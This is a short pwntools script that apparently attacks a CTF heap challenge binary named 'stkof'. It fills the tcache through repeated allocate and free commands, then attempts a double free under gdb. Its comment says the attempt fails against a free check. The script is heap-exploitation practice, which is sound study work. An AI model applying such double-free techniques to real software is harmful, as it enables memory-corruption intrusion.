import pwn as p


# Failed attempt at using a double free. There was a manual check in the code that prevents us from freeing again :/

target = p.process('./stkof')
p.gdb.attach(target, gdbscript='b *0x00400d2e')

ALLOC = '1'
READ = '2'
FREE = '3'
TODO = '4'


# allocate memory to fill tcache
print('First allocate 8 chunks')
for i in range(8):
    target.sendline(ALLOC)
    target.sendline('5')

print('The free 7')
# free it
for i in range(7):
    target.sendline(FREE)
    target.sendline(str(i+1))


# allocate 3 buffers
print('Then allocate 3 chunks')
target.sendline(ALLOC)
target.sendline('4')
target.sendline(ALLOC)
target.sendline('4')
target.sendline(ALLOC)
target.sendline('4')

# Now do the double free
print('Free first one')
target.sendline(FREE)
target.sendline('9')

print('Free second one')
target.sendline(FREE)
target.sendline('10')

print('Free first one again')
target.sendline(FREE)
target.sendline('9')


target.interactive()
